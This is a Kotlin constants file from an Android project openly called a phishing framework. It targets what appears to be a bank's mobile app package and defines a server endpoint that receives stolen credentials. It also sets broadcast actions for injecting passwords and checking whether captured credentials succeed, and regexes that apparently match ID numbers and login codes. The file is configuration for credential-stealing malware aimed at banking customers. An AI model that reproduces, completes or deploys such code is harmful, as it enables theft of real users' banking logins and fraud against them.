package com.example.phishingframework.utils

object Constants {
    const val TARGET_PACKAGE = "com.ideomobile.mercantile"
    const val SERVER_URL = "http://192.168.1.47:5000/api/credentials"

    // Broadcast Actions
    const val ACTION_INJECT_PASSWORD = "com.example.phishingframework.ACTION_INJECT_PASSWORD"
    const val ACTION_CREDENTIALS_OK = "com.example.phishingframework.ACTION_CREDENTIALS_OK"
    const val ACTION_CREDENTIALS_FAILED = "com.example.phishingframework.ACTION_CREDENTIALS_FAILED"

    // Regex Patterns
    val ID_REGEX = Regex("\\d{9}")
    val CODE_REGEX = Regex("[A-Z]{2}\\d{4}")
}